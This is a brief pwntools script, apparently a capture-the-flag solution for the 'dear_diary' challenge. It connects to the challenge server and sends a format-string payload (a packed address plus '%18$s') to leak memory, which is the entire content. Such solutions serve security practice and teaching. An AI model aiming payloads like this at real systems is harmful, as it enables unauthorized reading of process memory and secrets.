#!/usr/bin/python

# Nullp0inter's dear_diary solution
# <3 thx bt, duck, thwam, and whoever wrote the FSV presentation
# for us back in 2008

from pwn import *

# Uncomment to make remote
p = remote('diary.vuln.icec.tf',6501)

# Uncomment to make local
#p = process('/home/nullp0inter/Downloads/dear_diary')

p.recv()
p.sendline('1')
p.recv()
payload = p32(134520992)+'%18$s'
p.sendline(payload)
p.interactive()
